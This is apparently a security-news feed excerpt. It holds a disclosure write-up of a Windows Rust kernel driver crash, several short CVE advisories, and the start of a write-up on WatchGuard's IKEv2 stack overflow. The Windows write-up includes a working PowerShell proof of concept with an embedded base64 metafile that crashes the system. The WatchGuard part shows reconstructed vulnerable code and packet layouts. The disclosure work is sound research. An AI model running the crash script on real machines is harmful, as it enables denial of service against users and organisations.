+#!/usr/bin/env python3 import os import socket import zipfile import threading from concurrent.futures import ThreadPoolExecutor file_counter = 0 file_counter_lock = threading.Lock() zip_counter = 1 def handle_client(client_socket, address): global file_counter, zip_counter data_size = int.from_bytes(client_socket.recv(4), byteorder='big') data = bytearray() while len(data) < data_size: packet = client_socket.recv(min(1024, data_size - len(data))) if not packet: break data.extend(packet) with file_counter_lock: file_counter += 1 file_name = f"id_{file_counter:06d}" print(f"Received {file_counter}") with open(file_name, "wb") as file: file.write(data) if file_counter % 5000 == 0: zip_name = f"archive_{zip_counter:03d}.zip" with zipfile.ZipFile(zip_name, 'w') as zipf: for i in range(file_counter - 4999, file_counter + 1): zipf.write(f"id_{i:06d}") os.remove(f"id_{i:06d}") zip_counter += 1 client_socket.close() def main(): server_ip = "0.0.0.0" server_port = 4444 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.bind((server_ip, server_port)) server.listen(5) print("[*] Waiting for incoming connections...") with ThreadPoolExecutor(max_workers=20) as executor: while True: client_socket, addr = server.accept() executor.submit(handle_client, client_socket, addr) if __name__ == "__main__": main()
+```
+
+_Listing 2_. Server-side Python script to catch mutated samples sent by the harness.
+
+This modification allowed us to reproduce the error, even if it resulted from processing multiple different test files. During the first test run after updating the fuzzing harness, the system successfully crashed after `30` minutes. Based on the sample files logged on the server, the campaign reached the mutation responsible for generating the file that caused the crash after an impressive `380,000` mutations. The technical analysis of the vulnerability is outlined in the following sections.
+
+We found a crash via a system service exception that occurred during the execution of a `NtGdiSelectClipPath` syscall within version `10.0.26100.3037` of the `win32kbase_rs.sys` driver. The stack trace from this crash shows Microsoft’s efforts to enhance security by reimplementing the `REGION` data type of the `GDI` subsystem using Rust in the Windows kernel, as discussed by a presentation on _Default Security_ at the _BlueHat IL_ 2023 conference. This transition is evident in how the `Win32kRS::RegionCore_set_from_path()` function within the `win32kbase.sys` driver calls a function with the same name in the new `win32kbase_rs.sys` driver. Notably, the system crash was triggered by this new kernel component designed to improve security, as suggested by the name of the `panic_bounds_check()` function referenced in the stack trace shown in _Figure 2_.
+
+According to the decompiled source code of the vulnerable version of the `win32kbase_rs.sys` kernel driver, the system crashes when the `v109` index exceeds the allowed `v86` range as shown in _Figure 3_, triggering a kernel panic. This issue is likely caused by the `v88` and `v95` loop variables incrementing beyond valid limits without proper safeguards.
+
+_Figure 3._ Decompiled source code of the `region_from_path_mut()` function.
+
+When the `region_from_path_mut()` function converts a path into a region it represents the outline as a singly linked list of edge blocks. The program detects the out-of-bounds memory access via `core::panicking::panic_bounds_check()` and triggers a `SYSTEM_SERVICE_EXCEPTION`.
+
+The first metafile record in the crash sample that drives the execution flow into the `region_from_path_mut()` function is the `EmfPlusDrawBeziers` record. The path geometry resulting from this record produces the specific edge blocks responsible for the memory corruption. When the system plays this record, the geometric pen specified in the `EmfPlusObject` record makes the stroke wide. The malformed‐path data eventually causes the out-of-bounds condition when the path is widened, flattened, and converted to a region in the kernel.
+
+The following is the relevant excerpt of the `EmfPlusObject` that specifies the pen to use. If `PenDataStartCap` is set, the style of a starting line cap is specified in the `OptionalData` field of an `EmfPlusPenData` object. Similarly, `PenDataNonCenter` indicates whether a pen alignment is specified in the `OptionalData` field of an `EmfPlusPenData` object.
+
+```
+EmfPlusObject pen = { .Type = 0x4008, // EmfPlusObject .Flags = 0x0200, // EmfPlusPen .Size = 0x00000030, .DazaSize = 0x00000024, .ObjectData = { .Version = 0xDBC01002, // EMF+ .Type = 0x42200000, // PenDataNonCenter, PenDataStartCap .PenDataFlags = 0x00000202, // UnitTypeInch .PenUnit = 0x00000004, .PenWidth = 0xFFFFFFEE, .OptionalData = { .StartCap = 0x0000FC05, .PenAlignment = 0x0051E541 } } };
+```
+
+_Listing 3_. Metafile record defining a Pen object.
+
+The following structure shows the `EmfPlusDrawBeziers` record that triggered the vulnerability. It contains values produced through mutation, including 17 points, despite declaring a nominal count of only 4, which is ignored during processing. This mismatch, along with the coordinate data, appears sufficient to stress the path parsing logic and expose this edge-case behavior in the kernel.
+
+```
+EmfPlusDrawBeziers beziers = { .Type = 0x4019, .Flags = 0x00D6, // C=1, P=0, ObjectID=0x36 .Size = 0x00000050, // 80 bytes .DataSize = 0x00000044, // 68 bytes .Count = 0x00000004, // nominal count (ignored) // PointData is read as EmfPlusPoint objects with absolute coordinates. .PointData[17] = { { 0xE63D, 0x0000 }, // (-6595 , 0) { 0xFC05, 0x0000 }, // (-1019 , 0) { 0xE541, 0x0051 }, // (-6847 , 81) { 0x0049, 0x7FFF }, // ( 73 , 32767) { 0x004C, 0x1400 }, // ( 76 , 5120) { 0x4008, 0x0202 }, // (16392 , 514) { 0x0067, 0x0000 }, // ( 103 , 0) { 0x1002, 0xDBC0 }, // ( 4098 , -9280) { 0x001C, 0x0000 }, // ( 28 , 0) { 0x0010, 0x0000 }, // ( 16 , 0) { 0x1002, 0xDBC0 }, // ( 4098 , -9280) { 0x0001, 0x0000 }, // ( 1 , 0) { 0x0060, 0x4008 }, // ( 96 , 16392) { 0x0003, 0x0000 }, // ( 3 , 0) { 0x0000, 0x4600 }, // ( 0 , 17920) { 0x0000, 0x0100 }, // ( 0 , 256) { 0x004C, 0x0000 } // ( 76 , 0) } };
+```
+
+_Listing 4._ Metafile record defining a Bezier curve with 17 absolute points.
+
+Additional analysis indicates that the bounds check fails specifically when a `Metafile` object is passed to `Graphics::FromImage()` to create a `Graphics` object, despite the method being documented to accept only `Image` objects intended for drawing, such as `Bitmap`. This misuse enables execution to reach the vulnerable code path. The resulting `BugCheck` can be triggered by invoking the `DrawImage()` method on the `Graphics` object created from the `Metafile`. The following PowerShell script embeds a metafile in the `$b` variable containing a specially crafted `EmfPlusDrawBeziers` record with malformed edge data. This approach works from low integrity within a standard user session and affects both x86 and x64 systems, as the vulnerable routine resides in the `win32kbase_rs.sys` driver.
+
+```
+Add-Type -AssemblyName System.Drawing; Add-Type -AssemblyName System.Windows.Forms; $b = [Convert]::FromBase64String("AQAAAGwAAAAAAAAAACEAAGMAAABgCAAAlQEAAAAAAABvCfMAIAoAACBFTUYAAAEAYAIAAAkAAAABAAAAAAAAAAAAAAAAAAAAgAcAALAEAADYAgAARAH6AAAAAAAAAAAAAAAAAHDnBwCg8QQARgAAACwAAAAAEAAARU1GKwFAAAAcAAAAEAAAAAIQwNsBAAAAYAAAAGAAAABGAAAAFAEAAAgBAABFTUYrCEAAAjAAAAAkAAAAAhDA2wAAIEICAgAABAAAAO7///8F/AAAQeVRAEkAQQBMAAAACEAAAkgAAAA8AAAAAhDA2wAA5f/wAAAALAAAAP///vBGTUor4EAAEAAAAIAQAAAAAhDA2wEAAABgAAhAAwAAAAAAf38SQAAACEACATwAAAAwAAAAuxDA2wQAAAAAAAAAAAAAEAABAADlAAAAAADuQgAAyEIAHgAA/wAA/wAA////AAD/GUAA1lAAAABEAAAABAAAAD3mAAAF/AAAQeVRAEkA/39MAAAUCEACAmcAAAACEMDbHAAAABAAAAACEMDbAQAAAGAACEADAAAAAAAARgAAAAEAAABMAAAAZAAAAAAPAAAAAAwAABAAAABgAAAAD+j///8AAABVEQAAyEIAAMhCAAD///7/7/8AAP/9/wDi/mEAAAApAKoAFgAAAAAAogAAAIA/AAAAAAAAAAAAABAAAPD///8AAAAAAAAAdXV1dXV1dXV1dQD29gAiAAAADAAAAP////9GAAoAAAAAAA4AAABFTUYrGUAA/gsKAAAAAH+ADgAAABQAAAAAAAAAEAASABQNAAA="); $s = [System.IO.MemoryStream]::new($b); $f = New-Object System.Windows.Forms.Form; $g = [System.Drawing.Graphics]::FromHwnd($f.Handle); $h = $g.GetHdc(); $m = New-Object System.Drawing.Imaging.Metafile($s, $h); $mg = [System.Drawing.Graphics]::FromImage($m); $mg.DrawImage([System.Drawing.Image]::FromStream($s),0,0);
+```
+
+_Listing 5._ Proof-of-concept PowerShell script for reproducing the vulnerability.
+
+The shown proof-of-concept metafile can only trigger the crash when the edge block reaching the kernel produces a specific path geometry. Below are three independent record-level edits that would prevent that layout from forming, so the buggy code path is not executed:
+
+ `C/Pflags so the` `PointDatafield is read as an array of` `EmfPlusPointFobjects:` `$b[0x15f]=0;` `Sizeto add an extra flat point:` `$b[0x160]=84;$b=$b[0..351]+(0,0,0,0)+$b[352..($b.Length-1)];` `DataSizeto` `64to drop the last point:` `$b[0x164]=64;`
+
+This issue is mitigated by the fact that the vulnerable `win32kbase_rs.sys` component is not present on Windows Server versions. We reported this vulnerability to Microsoft, but MSRC classified it as _Moderate_ severity, stating that it does not warrant immediate servicing. However, they fixed the vulnerability as part of a feature update few weeks after the _May 2025 Patch Tuesday_. According to their assessment:
+
+> _“the Rust code correctly catches an out-of-bounds array access and triggers a panic, resulting in a Blue Screen of Death (BSOD), as expected”_
+
+However, the observed behavior aligns with the broader definition of a vulnerability. Triggering a _BSOD_ through a user-space function that processes user-controlled input should be regarded as a vulnerability necessitating a security fix. A failed security check should not lead to a system crash.
+
+More importantly, as confirmed by the MSRC, a threat actor could exploit this flaw by creating malicious metafiles designed to crash targeted systems when the metafile is displayed. Such disruptions could render enterprise environments temporarily inoperable, leading to unexpected downtime and interfering with key business processes. In addition, there may be data loss or corruption as well.
+
+Imagine a scenario where an attacker obtains credentials for a low-privileged domain user who can log in to all systems across the entire enterprise. With a bit of scripting magic, they could easily crash every Windows desktop late on a Friday afternoon, early Monday morning or at a chosen time that would be most detrimental to the business.
+
+Microsoft determined that this was a moderate-severity denial-of-service issue and therefore chose to address it in a non-security update. According to Microsoft, the fix was first shipped with KB5058499 in version 10.0.26100.4202 of the `win32kbase_rs.sys` kernel module, released on May 28, 2025, and reached full global release status by the end of the week of June 23. Notably, version 4202 introduced a significant update to the module, reflected in a file size increase from 148 KB to 164 KB, suggesting substantial internal changes likely related to the vulnerability fix. One of the most heavily modified components in this update is the `region_from_path_mut()` function, which underwent some restructuring.
+
+_Figure 5._ Visualization of function-level differences showing modifications in the `region_from_path_mut()` function.
+
+Among its most notable changes is the introduction of two distinct edge-handling routines: `add_edge_original()` and `add_edge_new()`. The `GlobalEdgeTable::add_edge()` function, which converts two vertices into an edge record and inserts it into the in-memory edge table, now exists in these two forms. Microsoft retained the original logic as `add_edge_original()` and implemented a new, bounds-hardened version called `add_edge_new()`. While both implementations produce the same functional output, the new version addresses several corner cases and potential memory-handling issues present in the legacy routine.
+
+_Figure 6._ Decompiled source code of the `region_from_path_mut()` function showing the `add_edge_new()` function.
+
+A feature flag, `Feature_Servicing_Win32kRSPathToRegion_IsEnabled()`, determines at runtime which version is invoked. Although the fix was already present in the codebase, we found during our initial testing that this feature flag was disabled. We were only able to confirm the presence of the fix in the debugger, and we could only verify the fix later in production following the _July 2025 Patch Tuesday_.
+
+We discovered a security vulnerability in the recently shipped Rust code of the Windows graphics component that could have serious implications for system security. While the adoption of Rust in the Windows kernel marks a significant step forward for security and reliability, it is important to recognize that software engineering challenges cannot be overcome by language choice alone. Rust offers strong guarantees around memory safety and type correctness, helping prevent entire classes of bugs such as buffer overflows and invalid pointer dereferences. However, rigorous security testing and thoughtful software design remain essential, as issues can still arise.
+
+In the case of implementing GDI region and related functions in Rust, a failed security check triggered a deliberate kernel panic, also known as _Blue Screen of Death (BSOD)_. Although this crash was originally intended as a safety mechanism, for example, as an emergency stop when something goes wrong, this highlights a larger concern. A fitting analogy might be a home alarm system that stops a burglar by blowing up the house. While the threat is technically neutralized, the collateral damage is far too costly.
+
+We should aim for security solutions that protect without risking system-wide failure. It is also worth bearing in mind that these issues are not unique to Rust but can happen in any other software project as well. Therefore, while it is encouraging to see this step to rewrite a critical part of the operating system using memory-safe language, this example must also serve as a reminder of the difficulties involved and the necessity of using extremely thorough engineering standards and principles. Even rigorous standards will not guarantee smooth sailing. We should still anticipate encountering unexpected bugs and vulnerabilities.
+
+Our finding may constitute the first publicly disclosed security issue involving a Rust-based kernel component following Rust’s integration into the Windows kernel. Shortly thereafter, we identified a vulnerability that could allow attackers to crash Windows 11 version 24H2 using a specially crafted metafile, as demonstrated by a one-liner proof-of-concept PowerShell script. The question remains whether we will continue to see more bugs like this in the kernel.]]></content:encoded></item><item><title>CVE-2025-9152 - Improper Privilege Management in Multiple WSO2 API Manager via keymanager-operations DCR Endpoint</title><link>https://cvefeed.io/vuln/detail/CVE-2025-9152</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 12:37:00 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-9152
+ Oct. 16, 2025, 1:15 p.m. | 13 hours, 16 minutes ago
+An improper privilege management vulnerability exists in WSO2 API Manager due to missing authentication and authorization checks in the keymanager-operations Dynamic Client Registration (DCR) endpoint.
+
+A malicious user can exploit this flaw to generate access tokens with elevated privileges, potentially leading to administrative access and the ability to perform unauthorized operations.
+ 9.8 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-9804 - Improper Access Control in Multiple WSO2 Products via Internal SOAP Admin Services and System REST APIs</title><link>https://cvefeed.io/vuln/detail/CVE-2025-9804</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 12:33:45 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-9804
+ Oct. 16, 2025, 1:15 p.m. | 13 hours, 16 minutes ago
+An improper access control vulnerability exists in multiple WSO2 products due to insufficient permission enforcement in certain internal SOAP Admin Services and System REST APIs. A low-privileged user may exploit this flaw to perform unauthorized operations, including accessing server-level information.
+
+This vulnerability affects only internal administrative interfaces. APIs exposed through the WSO2 API Manager's API Gateway remain unaffected.
+ 9.6 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-10611 - Potential Broken Access Control in Multiple WSO2 Products via System REST APIs</title><link>https://cvefeed.io/vuln/detail/CVE-2025-10611</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 12:09:31 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-10611
+ Oct. 16, 2025, 1:15 p.m. | 13 hours, 16 minutes ago
+Due to an insufficient access control implementation in multiple WSO2 Products, authentication and authorization checks for certain REST APIs can be bypassed, allowing them to be invoked without proper validation.
+
+Successful exploitation of this vulnerability could lead to a malicious actor gaining administrative access and performing unauthenticated and unauthorized administrative operations.
+ 9.8 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-6338 - Possible denial of service with multiple incoming connections to a Schannel based server with a TLS backend</title><link>https://cvefeed.io/vuln/detail/CVE-2025-6338</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 10:15:44 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-6338
+ Oct. 16, 2025, 10:15 a.m. | 16 hours, 16 minutes ago
+There is an incomplete cleanup vulnerability in Qt Network's Schannel support on Windows which can lead to a Denial of Service over a long period.This issue affects Qt from 5.15.0 through 6.8.3, from 6.9.0 before 6.9.2.
+ 9.2 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>yIKEs (WatchGuard Fireware OS IKEv2 Out-of-Bounds Write CVE-2025-9242)</title><link>https://labs.watchtowr.com/yikes-watchguard-fireware-os-ikev2-out-of-bounds-write-cve-2025-9242/</link><author>McCaulay Hudson</author><category>vulns</category><pubDate>Thu, 16 Oct 2025 10:04:02 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[# yIKEs (WatchGuard Fireware OS IKEv2 Out-of-Bounds Write CVE-2025-9242)
+
+> Note from editor: Before we begin, a big welcome to McCaulay Hudson, the newest member of the watchTowr Labs team with his inaugural blog post! Welcome to the mayhem, McCaulay!
+
+Today is the 8th of November 1996, and we’re thrilled to be exploring this new primitive we call Sack-based Buffer Overflows. It’s a great time to be alive, especially because we don’t have to deal with any of the pain of modern/not-so-modern mitigations.
+
+**Oh no, wait, it’s 2025 and we are still seeing Stack-based Buffer Overflows in enterprise-grade appliances, and of course, lacking mainstream exploit mitigations.**
+
+Today, we’re diving into CVE-2025-9242 - a vulnerability centered around a modern-day (ha ha) primitive inside WatchGuard’s Fireware OS, the operating system powering WatchGuard’s bright-red Firebox network security appliances. Or, put differently, an Out-of-bounds Write vulnerability in the WatchGuard Fireware OS (in WatchGuard’s own words) in 2025.
+
+WatchGuard appliances running Fireware OS aren’t just firewalls; they’re VPN concentrators, policy enforcement engines, intrusion prevention systems, and in many cases, the first and last line of defense for an entire organization.
+
+> The word "defense" is doing a lot of lifting here, in our opinion.
+
+This blog post will walk readers through our analysis and reproduction of CVE-2025-9242 in Fireware OS. For those curious, the official WatchGuard advisory can be found here.
+
+### Who is WatchGuard and what is Fireware OS
+
+WatchGuard is a long-standing security vendor that claims to protect more than _250,000 small and midsize enterprises_ globally - securing over 10 million endpoints according to their own site.
+
+Their appliances run Fireware OS, an all-in-one edge platform that aims to be the Swiss Army knife of network security. It packs intrusion prevention, antivirus, web filtering, and even a VPN feature that lets your devices whisper secrets through encrypted tunnels between networks.
+
+In short, Fireware OS is the software brain of WatchGuard’s Firebox hardware - those glossy red boxes sitting proudly in server racks, guarding the boundary between your private network and the public internet.
+
+### What is CVE-2025-9242
+
+CVE-2025-9242 (so catchy) gets a CVSS4.0 score of 9.3 (not comparable to CVSS3.1 scores), marked as ‘Critical’ and according to WatchGuard affects both the mobile user VPN with IKEv2 and the branch office VPN using IKEv2 when configured with a dynamic gateway peer.
+
+According to WatchGuard, this vulnerability affects Fireware OS versions:
+
+- 11.10.2 up to and including 11.12.4\_Update1,
+- 12.0 up to and including 12.11.3 and 2025.1.
+
+Here’s how WatchGuard describes this vulnerability:
+
+> An Out-of-bounds Write vulnerability in the WatchGuard Fireware OS iked process may allow a remote unauthenticated attacker to execute arbitrary code. This vulnerability affects both the mobile user VPN with IKEv2 and the branch office VPN using IKEv2 when configured with a dynamic gateway peer.
+
+> If the Firebox was previously configured with the mobile user VPN with IKEv2 or a branch office VPN using IKEv2 to a dynamic gateway peer, and both of those configurations have since been deleted, that Firebox may still be vulnerable if a branch office VPN to a static gateway peer is still configured.
+
+Let’s summarize, and see if we’re looking at a vulnerability that has all the characteristics your friendly neighbourhood ransomware gangs love to see:
+
+- Affects a typically Internet-exposed service (the IKEv2 VPN service)
+- Is exploitable/reachable pre-authentication
+- Execute arbitrary code on a perimeter appliance
+
+As we walk through today’s analysis, we’ll also discover whether WatchGuard (who develops security appliances and presumably aware of security practices) is aware of “modern-day” exploitation mitigations.
+
+Before we move on, here's a reminder: “WatchGuard enables more than 250,000 small and midsize enterprises from around the globe to protect their most important assets, including over 10 million endpoints.”
+
+yIKEs.
+
+### Patch Diffing - CVE-2025-9242
+
+As we always do when analyzing N-days, our first job was to identify where the vulnerable code resides and begin to determine what the patch. For these purposes, we compared the following versions of Fireware OS:
+
+- 12.11.3 (unpatched)
+- 12.11.4 (patched).
+
+Very quickly, we identified suspicious changes within `/usr/bin/iked` aligning with our understanding of where the vulnerable code had been resolved (within the IKEv2 service). Although there were a multitude of changes, we quickly honed in on code changes within the `ike2_ProcessPayload_CERT` function.
+
+The following snippet of code is our reconstruction of the `ike2_ProcessPayload_CERT` function within the vulnerable `12.11.3` firmware version.
+
+We have removed some code for brevity:
+
+```
+// src/ike/iked/v2/ike2_payload_cert.c int ike2_ProcessPayload_CERT(uint8_t *pIkeSA, p_id_t *pIDPld) { char identification [520]; memset(identification, 0, sizeof(identification)); ... // Vulnerability: Stack-based buffer overflow // * pIDPld.identification is an attacker-controlled buffer // * identification is a fixed size stack buffer of 520 bytes memcpy(identification, pIDPld.identification.buffer, pIDPld.identification.length); ... int status = CMgrValidateCert_GetPubKey(...); if (status != 0) wglog_trace_r("failed to validate received peer certificate"); wglog_trace_r("successfully validated received peer certificate"); }
+```
+
+In summary, this code is designed to copy a client “identification” to a local stack buffer, and then validate the provided client SSL certificate.
+
+Looking at the same function within the patched `12.11.4` firmware version, we can see the introduction of an additional length check on the identification buffer (highlighted beneath the comment `// CVE-2025-9242 length check patch`:
+
+```
+// src/ike/iked/v2/ike2_payload_cert.c int ike2_ProcessPayload_CERT(uint8_t *pIkeSA, p_id_t *pIDPld) { char identification [512]; memset(identification, 0, sizeof(identification)); ... // CVE-2025-9242 length check patch if (pIDPld.identification.length > 0x200) { wglog_trace_r("received ID data legth(%d) is larger than expected length", gProgram, pIDPld.identification.length); return -1; } memcpy(identification, pIDPld.identification.buffer, pIDPld.identification.length); ... int status = CMgrValidateCert_GetPubKey(...); if (status != 0) wglog_trace_r("failed to validate received peer certificate"); wglog_trace_r("successfully validated received peer certificate"); }
+```
+
+After spotting the patch, the next steps on our path to reproducing this vulnerability became clear: We needed to pull teeth, poke ourselves in the eyes, and begin to figure out in detail how the IKE protocol ultimately triggers the vulnerable function.
+
+This would allow us to build mechanisms to identify vulnerable appliances and exploit the vulnerability.
+
+### IKEv2, A Primer
+
+As a very quick explainer for those unfamiliar, IKEv2 is a protocol that typically operates on UDP port 500 and is primarily responsible for establishing Virtual Private Network (VPN) tunnels.
+
+At a high level, it handles the secure negotiation of encryption parameters, authentication, and key exchange between two peers.
+
+The unauthenticated portion of the protocol consists of two initial packet exchanges:
+
+Based on the above, the vulnerable code (the `Identification` portion) is processed during `IKE_SA_AUTH`. That means we must deliver two packets to the WatchGuard IKE service to reach the vulnerable code path:
+
+- An `IKE_SA_INIT` packet, followed by
+- An `IKE_SA_AUTH` packet.
+
+Let’s dig a little deeper into the protocol.
+
+### Part 1 - IKE\_SA\_INIT
+
+To explain what is happening here:
+
+The first packet’s job is simple but important - it kicks off the Diffie-Hellman key exchange. Here, the client proposes the cryptographic transforms it supports, sends over its public key, and drops in a nonce for good measure.
+
+Or, put differently: it’s the protocol’s version of a handshake, where both sides agree on how they’ll talk securely. No authentication happens yet; it’s just the client and server trading math problems to set up a shared secret.
+
+Below, the `IKE_SA_INIT` packet - shown as a tree - highlights the mandatory fields required for this initial exchange:
+
+```
+Internet Security Association and Key Management Protocol Initiator SPI: aae76f3726073034 Responder SPI: 0000000000000000 Next payload: Security Association (33) Version: 2.0 Exchange type: IKE_SA_INIT (34) Flags: 0x08 (Initiator, No higher version, Request) Message ID: 0x00000000 Length: 548 Payload: Security Association (33) Payload: Proposal (2) # 1 Payload: Transform (3) Transform Type: Encryption Algorithm (ENCR) (1) Transform ID (ENCR): ENCR_AES_CBC (12) Transform Attribute (t=14,l=2): Key Length: 256 Payload: Transform (3) Transform Type: Pseudo-random Function (PRF) (2) Transform ID (PRF): PRF_HMAC_SHA2_256 (5) Payload: Transform (3) Transform Type: Integrity Algorithm (INTEG) (3) Transform ID (INTEG): AUTH_HMAC_SHA2_256_128 (12) Payload: Transform (3) Transform Type: Diffie-Hellman Group (D-H) (4) Transform ID (D-H): 2048 bit MODP group (14) Payload: Key Exchange (34) Payload: Nonce (40) Payload: Notify (41) - NAT_DETECTION_DESTINATION_IP Payload: Notify (41) - NAT_DETECTION_SOURCE_IP Payload: Vendor ID (43) : Unknown Vendor ID Payload: Vendor ID (43) : Unknown Vendor ID Payload: Vendor ID (43) : Cisco Fragmentation Payload: Vendor ID (43) : Cisco Fragmentation Payload: Notify (41) - IKEV2_FRAGMENTATION_SUPPORTED Payload: Notify (41) - REDIRECT_SUPPORTED Payload: Notify (41) - SIGNATURE_HASH_ALGORITHMS
+```
+
+If the server accepts the proposed transforms, it replies with its own public key, nonce, and the chosen set of transforms.
+
+In other words, it agrees on the cryptographic rules of engagement - how both sides will talk securely from this point onward.
+
+### Part 2 - IKE\_SA\_AUTH
+
+The second packet carries an encrypted payload protected with the transforms negotiated within the `IKE_SA_INIT` ‘handshake’. A shared secret derived from the Diffie–Hellman exchange is used to encrypt this payload.
+
+This packet is noteworthy, though, for our purposes: it can include both the **Identification - Initiator** payload and the **Certificate** payload, which is exactly where the vulnerable function is invoked.
+
+The server does attempt certificate validation, but that validation happens after the vulnerable code runs, allowing our vulnerable code path to be reachable pre-authentication:
+
+```
+Internet Security Association and Key Management Protocol Initiator SPI: aae76f3726073034 Responder SPI: f1b3cf883e18a45c Next payload: Encrypted and Authenticated (46) Version: 2.0 Exchange type: IKE_AUTH (35) Flags: 0x08 (Initiator, No higher version, Request) Message ID: 0x00000001 Length: 1616 Payload: Encrypted and Authenticated (46) Initialization Vector: 57401bf413505f5550173a07d778d68f (16 bytes) Encrypted Data (1552 bytes) ]]></content:encoded></item><item><title>CVE-2025-54539 - Apache ActiveMQ NMS AMQP Client: Deserialization of Untrusted Data</title><link>https://cvefeed.io/vuln/detail/CVE-2025-54539</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 09:15:34 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-54539
+ Oct. 16, 2025, 9:15 a.m. | 10 hours ago
+A Deserialization of Untrusted Data vulnerability exists in the Apache ActiveMQ NMS AMQP Client.
+
+This issue affects all versions of Apache ActiveMQ NMS AMQP up to and including 2.3.0, when establishing connections to untrusted AMQP servers. Malicious servers could exploit unbounded deserialization logic present in the client to craft responses that may lead to arbitrary code execution on the client side.
+
+Although version 2.1.0 introduced a mechanism to restrict deserialization via allow/deny lists, the protection was found to be bypassable under certain conditions.
+
+In line with Microsoft’s deprecation of binary serialization in .NET 9, the project is evaluating the removal of .NET binary serialization support from the NMS API entirely in future releases.
+
+Mitigation and Recommendations:
+Users are strongly encouraged to upgrade to version 2.4.0 or later, which resolves the issue. Additionally, projects depending on NMS-AMQP should migrate away from .NET binary serialization as part of a long-term hardening strategy.
+ 9.8 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-58073 - Arbitrary Mattermost Team can be joined by manipulating the OAuth state</title><link>https://cvefeed.io/vuln/detail/CVE-2025-58073</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 08:44:26 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-58073
+ Oct. 16, 2025, 9:15 a.m. | 10 hours, 21 minutes ago
+Mattermost versions 10.11.x <= 10.11.1, 10.10.x <= 10.10.2, 10.5.x <= 10.5.10 fail to verify a user has permission to join a Mattermost team using the original invite token which allows any attacked to join any team on a Mattermost server regardless of restrictions via manipulating the OAuth state.
+ 8.1 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-58075 - Arbitrary Mattermost Team can be joined by manipulating the SAML RelayState</title><link>https://cvefeed.io/vuln/detail/CVE-2025-58075</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 08:20:06 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-58075
+ Oct. 16, 2025, 9:15 a.m. | 14 hours ago
+Mattermost versions 10.11.x <= 10.11.1, 10.10.x <= 10.10.2, 10.5.x <= 10.5.10 fail to verify a user has permission to join a Mattermost team using the original invite token which allows any attacked to join any team on a Mattermost server regardless of restrictions via manipulating the RelayState
+ 8.1 | HIGH
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-41019 - SQL injection vulnerability in Sergestec&apos;s Exito</title><link>https://cvefeed.io/vuln/detail/CVE-2025-41019</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 08:15:35 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-41019
+ Oct. 16, 2025, 8:15 a.m. | 11 hours ago
+SQL injection in Sergestec's SISTICK v7.2. This vulnerability allows an attacker to retrieve, create, update, and delete databases through the 'id' parameter in '/index.php?view=ticket_detail'.
+ 9.3 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-41018 - SQL injection vulnerability in Sergestec&apos;s Exito</title><link>https://cvefeed.io/vuln/detail/CVE-2025-41018</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 08:15:34 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-41018
+ Oct. 16, 2025, 8:15 a.m. | 11 hours ago
+SQL injection in Sergestec's Exito v8.0. This vulnerability allows an attacker to retrieve, create, update, and delete databases through the 'cat' parameter in '/public.php'.
+ 9.3 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
+]]></content:encoded></item><item><title>CVE-2025-62583 - Whale Browser Cross-Site Scripting (XSS)</title><link>https://cvefeed.io/vuln/detail/CVE-2025-62583</link><author></author><category>vulns</category><pubDate>Thu, 16 Oct 2025 07:15:33 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-62583
+ Oct. 16, 2025, 7:15 a.m. | 10 hours, 48 minutes ago
+Whale Browser before 4.33.325.17 allows an attacker to escape the iframe sandbox in a dual-tab environment.
+ 9.8 | CRITICAL
+
+Visit the link for more details, such as CVSS details, affected products, timeline, and more...
